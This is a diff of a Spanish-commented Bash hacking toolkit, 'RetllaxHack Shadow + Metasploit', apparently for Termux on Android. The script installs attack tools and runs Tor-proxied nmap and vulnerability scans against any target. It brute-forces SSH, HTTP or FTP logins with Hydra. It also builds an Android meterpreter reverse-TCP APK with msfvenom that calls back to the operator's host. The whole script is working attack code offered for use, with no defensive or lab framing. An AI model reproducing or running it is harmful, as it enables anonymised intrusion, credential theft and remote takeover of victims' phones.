@@ -1,123 +1,164 @@
 #!/usr/bin/env bash
 
-# RetllaxHack Shadow + Metasploit (v9.0)
-# Todas las funciones originales + Metasploit (No Root)
+# RetllaxHack Shadow + Metasploit (v9.0.1) - Termux (No Root)
+# By Retllax - Escaneo global con Tor y Metasploit integrado
 
-# ===== CONFIGURACIÓN RGB (Conservada) =====
+# ===== CONFIGURACIÓN RGB (Icono de RetllaxHack) =====
 function rgb {
   colors=("196" "40" "214" "39" "200" "226")
   echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
 }
 
-# ===== BANNER ANIMADO (Original) =====
+# ===== BANNER RETLLAXHACK =====
 function show_banner {
   clear
   echo
-  rgb " ██▀███  ▓█████ ▄▄▄       ██▓     ██░ ██  ▄▄▄     ▓██   ██▓"
-  rgb "▓██ ▒ ██▒▓█   ▀▒████▄    ▓██▒    ▓██░ ██▒▒████▄    ▒██  ██▒"
-  rgb "▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▒██░    ▒██▀▀██░▒██  ▀█▄   ▒██ ██░"
-  rgb "▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒██░    ░▓█ ░██ ░██▄▄▄▄██  ░ ▐██▓░"
-  rgb "░██▓ ▒██▒░▒████▒▓█   ▓██▒░██████▒░▓█▒░██▓ ▓█   ▓██▒ ░ ██▒▓░"
-  rgb "░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░  ██▒▒▒ "
-  rgb "  ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░▓██ ░▒░ "
-  rgb "  ░░   ░    ░    ░   ▒     ░ ░    ░  ░░ ░  ░   ▒   ▒ ▒ ░░  "
-  rgb "   ░        ░  ░     ░  ░    ░  ░ ░  ░  ░      ░  ░░ ░     "
-  rgb "                                                        ░ ░ "
+  rgb " ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗ █████╗ ██╗  ██╗"
+  rgb "██╔════╝ ██╔════╝╚══██╔══╝██║  ██║╚██╗██╔╝██╔══██╗╚██╗██╔╝"
+  rgb "██║  ███╗█████╗     ██║   ███████║ ╚███╔╝ ███████║ ╚███╔╝ "
+  rgb "██║   ██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██║ ██╔██╗ "
+  rgb "╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║██╔╝ ██╗"
+  rgb " ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
+  rgb "               SHADOW EDITION + METASPLOIT v9.0.1"
   echo
-  rgb "============= SHADOW EDITION v9.0 ============="
-  rgb "=== + METASPLOIT (NO ROOT) ==="
+  rgb "=== ESCANEO GLOBAL | FUERZA BRITA | EXPLOITS (NO ROOT) ==="
   echo
 }
 
-# ===== FUNCIÓN NUEVA: METASPLOIT =====
-function metasploit_module {
-  # Verificar instalación
-  if ! command -v msfconsole >/dev/null; then
-    rgb "[~] Instalando Metasploit (Paciente, 1GB aprox)..."
-    pkg install unstable-repo -y
-    pkg install metasploit -y
-    rgb "[~] Configurando PostgreSQL..."
-    pg_ctl -D $PREFIX/var/lib/postgresql start
+# ===== VERIFICAR DEPENDENCIAS =====
+function check_deps {
+  if ! command -v tor >/dev/null || ! command -v proxychains >/dev/null; then
+    rgb "[~] Instalando Tor y Proxychains..."
+    pkg install tor proxychains-ng -y
+    tor &
   fi
 
-  show_banner
-  rgb "[!] MÓDULOS DISPONIBLES (Sin Root):"
-  rgb "1) Generar Payload (msfvenom)"
+  if ! command -v nmap >/dev/null; then
+    rgb "[~] Instalando Nmap..."
+    pkg install nmap -y
+  fi
+
+  if ! command -v hydra >/dev/null; then
+    rgb "[~] Instalando Hydra..."
+    pkg install hydra -y
+  fi
+
+  if ! command -v msfconsole >/dev/null; then
+    rgb "[~] Instalando Metasploit (1GB+ de espacio)..."
+    pkg install unstable-repo metasploit -y
+    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
+  fi
+}
+
+# ===== ESCANEO GLOBAL (Con Tor) =====
+function global_scan {
+  read -p "$(rgb "[?] IP/Dominio a escanear (ej: google.com): ")" target
+  read -p "$(rgb "[?] Puertos (ej: 80,443 o 1-1000): ")" ports
+
+  rgb "[~] Escaneando $target (Tor + Proxychains)..."
+  proxychains -q nmap -Pn -sS -T4 --open -p $ports $target -oN retllax_scan.log
+
+  rgb "[~] Buscando vulnerabilidades (CVE)..."
+  proxychains -q nmap -Pn --script vuln -p $(grep "open" retllax_scan.log | awk -F'/' '{print $1}' | tr '\n' ',') $target >> retllax_vulns.log 2>&1
+
+  rgb "[✔] Resultados:"
+  grep --color "open" retllax_scan.log
+  grep --color -E "VULNERABLE|CVE-" retllax_vulns.log
+}
+
+# ===== HYDRA SHADOW (Fuerza Bruta) =====
+function hydra_attack {
+  read -p "$(rgb "[?] IP/Dominio: ")" target
+  read -p "$(rgb "[?] Usuario (ej: admin): ")" user
+  read -p "$(rgb "[?] Ruta al diccionario: ")" wordlist
+
+  rgb "[~] Detectando servicios..."
+  service=$(proxychains -q nmap -p- --open $target | grep "open" | head -n 1 | awk '{print $3}')
+
+  case $service in
+    ssh) port=22 ;;
+    http|http-proxy) port=80 ;;
+    ftp) port=21 ;;
+    *) read -p "$(rgb "[?] Puerto manual: ")" port ;;
+  esac
+
+  rgb "[~] Atacando $service ($target:$port)..."
+  proxychains -q hydra -l $user -P $wordlist -t 6 -s $port $target $service -o retllax_hydra.log
+
+  rgb "[+] Resultados:"
+  grep --color "login:" retllax_hydra.log
+}
+
+# ===== METASPLOIT (No Root) =====
+function metasploit_mod {
+  if ! pgrep postgres >/dev/null; then
+    rgb "[~] Iniciando PostgreSQL..."
+    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
+    sleep 5
+  fi
+
+  rgb "[!] Módulos RetllaxHack:"
+  rgb "1) Generar Payload Android"
   rgb "2) Buscar Exploits"
-  rgb "3) Escaneo con Módulos Auxiliares"
+  rgb "3) Escanear Red (Auxiliar)"
   echo
-  read -p "$(rgb "[?] Opción Metasploit: ")" opt
+  read -p "$(rgb "[?] Opción: ")" opt
 
   case $opt in
     1)
-      read -p "$(rgb "[?] Tipo (ej. android/meterpreter/reverse_tcp): ")" payload
-      read -p "$(rgb "[?] LHOST: ")" lhost
-      read -p "$(rgb "[?] LPORT: ")" lport
-      read -p "$(rgb "[?] Nombre archivo: ")" output
-      msfvenom -p $payload LHOST=$lhost LPORT=$lport -o $output
-      rgb "[✔] Payload generado en $output"
+      read -p "$(rgb "[?] LHOST (tu IP): ")" lhost
+      read -p "$(rgb "[?] LPORT (4444): ")" lport
+      msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o retllax_payload.apk
+      rgb "[✔] Payload: retllax_payload.apk"
       ;;
     2)
-      read -p "$(rgb "[?] Nombre servicio/software: ")" query
+      read -p "$(rgb "[?] Buscar (ej: Apache): ")" query
       msfconsole -q -x "search $query; exit"
       ;;
     3)
-      read -p "$(rgb "[?] IP a escanear: ")" target
+      read -p "$(rgb "[?] IP/Rango (ej: 192.168.1.0/24): ")" target
       msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit"
       ;;
-    *) rgb "[!] Opción no válida";;
+    *) rgb "[!] Opción inválida";;
   esac
 }
 
-# ===== FUNCIONES ORIGINALES (Sin Modificaciones) =====
-function shadow_scan {
-  # ... (código original idéntico)
-}
-
-function hydra_shadow {
-  # ... (código original idéntico) 
-}
-
-function scan_vulns {
-  # ... (código original idéntico)
-}
-
-# ===== MENÚ ACTUALIZADO (Conservando todo) =====
-function shadow_menu {
+# ===== MENÚ RETLLAXHACK =====
+function main_menu {
+  check_deps
   while true; do
     show_banner
-    rgb "1) Escaneo Sigiloso (Tor)"
-    rgb "2) Hydra Shadow (8 Hilos + Tor)"
-    rgb "3) Buscar Vulnerabilidades"
-    rgb "4) Módulo Metasploit"
-    rgb "5) Ver Resultados"
-    rgb "6) Salir"
+    rgb "1) Escaneo Global (Tor)"
+    rgb "2) Ataque Hydra Shadow"
+    rgb "3) Módulo Metasploit"
+    rgb "4) Ver Logs"
+    rgb "5) Salir"
     echo
-    read -p "$(rgb "[?] Opción: ")" opt
+    read -p "$(rgb "[?] Elige una opción: ")" opt
 
     case $opt in
-      1) shadow_scan ;;
-      2) hydra_shadow ;;
-      3) scan_vulns ;;
-      4) metasploit_module ;;
-      5) 
-        [ -f "scan_shadow.log" ] && cat scan_shadow.log | grep --color "open"
-        [ -f "hydra_shadow.log" ] && cat hydra_shadow.log | grep --color "login:"
-        [ -f "vuln_scan.log" ] && cat vuln_scan.log | grep --color -E "VULNERABLE|CVE-"
+      1) global_scan ;;
+      2) hydra_attack ;;
+      3) metasploit_mod ;;
+      4)
+        [ -f "retllax_scan.log" ] && cat retllax_scan.log | grep --color "open"
+        [ -f "retllax_vulns.log" ] && cat retllax_vulns.log | grep --color -E "VULNERABLE|CVE-"
+        [ -f "retllax_hydra.log" ] && cat retllax_hydra.log | grep --color "login:"
         ;;
-      6) exit 0 ;;
-      *) rgb "[!] Opción inválida"; sleep 1 ;;
+      5)
+        pkill -f tor
+        rgb "[!] Saliendo de RetllaxHack..."
+        exit 0
+        ;;
+      *)
+        rgb "[!] Opción no válida"
+        sleep 1
+        ;;
     esac
-    read -p "$(rgb "[?] Enter para continuar...")"
+    read -p "$(rgb "[?] Presiona Enter para continuar...")"
   done
 }
 
-# ===== INICIO (Actualizado para Metasploit) =====
+# ===== INICIO =====
 show_banner
-rgb "[~] Verificando dependencias..."
-command -v tor >/dev/null || pkg install tor -y
-command -v proxychains4 >/dev/null || pkg install proxychains-ng -y
-command -v nmap >/dev/null || pkg install nmap -y
-command -v hydra >/dev/null || pkg install hydra -y
-
-shadow_menu
+main_menu
